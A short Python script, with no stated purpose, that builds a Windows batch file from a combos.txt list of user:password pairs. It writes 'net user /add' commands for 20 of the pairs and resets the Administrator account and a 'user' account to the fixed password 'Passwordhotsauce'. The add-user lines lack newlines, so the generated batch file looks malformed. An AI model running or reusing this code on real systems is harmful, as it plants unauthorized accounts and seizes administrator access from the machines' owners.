import inspect
import os
from pathlib import Path
import random
import shutil

def execute():
    #print("Hello World!")
    #print(os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe()))))
    location = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))

    combos = []
    with open(location+"\\combos.txt", "r") as f:
        for line in f.readlines():
            combos.append(line.split(":"))

    random.shuffle(combos)
    combos_len = int(len(combos)/10)

    shutil.copyfile(location+"\\t_execute.bat", location+"\\execute.bat")

    with open(location+"\\execute.bat", "a") as f:
        for combo in combos[:20]:
            user = combo[0]
            password = combo[1]
            f.write(f"cmd /c net user /add {user} {password}")
        f.write(f"cmd /c net user Administrator Passwordhotsauce\n")
        f.write(f"cmd /c net user user Passwordhotsauce\n")
    return None
